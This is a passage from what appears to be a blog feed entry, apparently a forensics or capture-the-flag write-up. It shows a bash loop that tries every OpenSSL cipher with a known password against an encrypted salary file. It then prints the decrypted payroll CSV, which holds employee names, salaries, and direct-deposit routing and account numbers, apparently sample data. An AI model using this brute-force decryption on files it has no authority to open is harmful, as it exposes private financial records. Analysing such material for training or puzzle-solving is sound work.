-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat crack-openssl.sh
-</span><span class='line'><span class="c">#!/usr/bin/env bash</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span><span class="sb">`</span>openssl list-cipher-commands<span class="sb">`</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">for</span> c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
-</span><span class='line'>  openssl enc -d -<span class="s2">&quot;$c&quot;</span> -in salary_dec2003.csv.enc -k tarot -out csv/salary_dec2003.csv.<span class="nv">$c</span>-decrypted
-</span><span class='line'><span class="k">done</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In a few gibberish files we read csv/salary_dec2003.csv.aes-128-cbc-decrypted:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat csv/salary_dec2003.csv.aes-128-cbc-decrypted  | head -15
-</span><span class='line'>,Employee information,,,,,,,,,,,,,,
-</span><span class='line'>,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage
-</span><span class='line'>),Total Taxes Withheld (Percentage),"Insurance
-</span><span class='line'>Deduction
-</span><span class='line'>(Dollars)","Other Regular
-</span><span class='line'>Deduction
-</span><span class='line'>(Dollars)","Total Regular Deductions (Excluding taxes, in dollars)","Direct Deposit Info
-</span><span class='line'>Routing Number","Direct Deposit Info
-</span><span class='line'>Account Number"
-</span><span class='line'>,1,Charles E. Ophenia,"$225,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
-</span><span class='line'>,2,Marie Mary,"$56,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
-</span><span class='line'>,3,Pat Patrick,"$43,350.00",1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2334432
-</span><span class='line'>,4,Terry Thompson,"$27,500.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$225.00,$350.00,183200299,1278235
-</span><span class='line'>,5,Ben Benedict,"$29,750.00",1,3,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$122.50,$247.50,183200299,2332546
-</span><span class='line'>,6,Erin Gennieg,"$105,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1456567
-</span><span class='line'>,7,Paul Michael,"$76,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1446756</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
